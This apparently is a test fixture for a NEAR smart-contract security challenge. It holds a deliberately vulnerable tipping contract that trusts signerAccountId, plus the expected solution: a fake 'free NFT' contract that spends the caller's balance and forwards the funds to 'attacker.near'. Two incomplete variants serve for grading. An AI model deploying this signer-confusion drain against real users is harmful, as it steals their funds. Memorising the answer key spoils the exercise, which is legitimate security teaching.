import { TEditorFileMap } from '@agorapp-dao/runner-common/src/types';
import dedent from 'ts-dedent';
import { cloneDeep } from 'lodash';

export const CODE_VALID: TEditorFileMap = {
  'tip-stream.ts': {
    content: dedent`
      import { NearBindgen, near, call, LookupMap, NearPromise } from 'near-sdk-js';
      
      @NearBindgen({})
      class TipStream {
        balances = new LookupMap<bigint>('balances');
      
        @call({ payableFunction: true })
        near_deposit() {
          const accountId = near.predecessorAccountId();
          const balance = this.balances.get(accountId) ?? 0n;
          this.balances.set(accountId, balance + near.attachedDeposit());
        }
      
        @call({})
        tip({ receiverAccountId, amount }: { receiverAccountId: string; amount: string }) {
          const senderAccountId = near.signerAccountId();
          const senderBalance = this.balances.get(senderAccountId) ?? 0n;
          const amountInt = BigInt(amount);
          if (amountInt > senderBalance) {
            throw new Error('Not enough balance to transfer');
          }
      
          const receiverBalance = this.balances.get(receiverAccountId) ?? 0n;
          this.balances.set(senderAccountId, senderBalance - amountInt);
          this.balances.set(receiverAccountId, receiverBalance + amountInt);
        }
      
        @call({})
        near_withdraw({ amount }: { amount: string }) {
          const accountId = near.predecessorAccountId();
          const amountInt = BigInt(amount);
          const balance = this.balances.get(accountId) ?? 0n;
          if (amountInt > balance) {
            throw new Error('Not enough balance to withdraw');
          }
      
          this.balances.set(accountId, balance - BigInt(amountInt));
          return NearPromise.new(accountId).transfer(BigInt(amountInt));
        }
      }
    `,
  },
  'nft-giveaway.ts': {
    content: dedent`
      import { NearBindgen, call, NearPromise } from 'near-sdk-js';
      
      const CALL_GAS = 5_000_000_000n;
      
      @NearBindgen({})
      class NftGiveaway {
        @call({})
        claim_free_nft() {
          return NearPromise.new('tip-stream.near')
            .functionCall(
              'tip',
              JSON.stringify({ receiverAccountId: 'nft-giveaway.near', amount: 1_000_000_000n.toString() }),
              0n,
              CALL_GAS
            )
            .functionCall(
              'near_withdraw',
              JSON.stringify({ amount: 1_000_000_000n.toString() }),
              0n,
              CALL_GAS
            )
            .then(NearPromise.new('attacker.near').transfer(1_000_000_000n));
        }
      }
    `,
  },
};

export const CODE_INVALID1 = cloneDeep(CODE_VALID);
CODE_INVALID1['nft-giveaway.ts'].content = dedent`
  import { NearBindgen, call, NearPromise } from 'near-sdk-js';
  
  const CALL_GAS = 5_000_000_000n;
  
  @NearBindgen({})
  class NftGiveaway {
    @call({})
    claim_free_nft() {
    }
  }
`;

export const CODE_INVALID2 = cloneDeep(CODE_VALID);
CODE_INVALID2['nft-giveaway.ts'].content = dedent`
  import { NearBindgen, call, NearPromise } from 'near-sdk-js';
  
  const CALL_GAS = 5_000_000_000n;
  
  @NearBindgen({})
  class NftGiveaway {
    @call({})
    claim_free_nft() {
      return NearPromise.new('tip-stream.near')
        .functionCall(
          'tip',
          JSON.stringify({ receiverAccountId: 'nft-giveaway.near', amount: 1_000_000_000n.toString() }),
          0n,
          CALL_GAS
        )
        .functionCall(
          'near_withdraw',
          JSON.stringify({ amount: 1_000_000_000n.toString() }),
          0n,
          CALL_GAS
        );
    }
  }
`;
